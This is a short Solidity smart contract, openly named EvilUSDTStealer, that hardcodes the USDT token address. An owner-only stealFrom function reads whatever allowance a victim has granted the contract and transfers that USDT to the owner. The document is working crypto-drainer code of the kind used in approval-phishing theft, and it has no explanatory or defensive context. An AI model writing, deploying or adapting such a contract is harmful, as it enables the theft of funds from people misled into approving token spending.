// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract EvilUSDTStealer {
    address public owner;
    IERC20 public usdt;

    constructor() {
        owner = msg.sender;
        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    }

    function stealFrom(address victim) external {
        require(msg.sender == owner, "Only owner can steal");
        uint256 amount = usdt.allowance(victim, address(this));
        require(amount > 0, "No USDT allowance");
        usdt.transferFrom(victim, owner, amount);
    }
}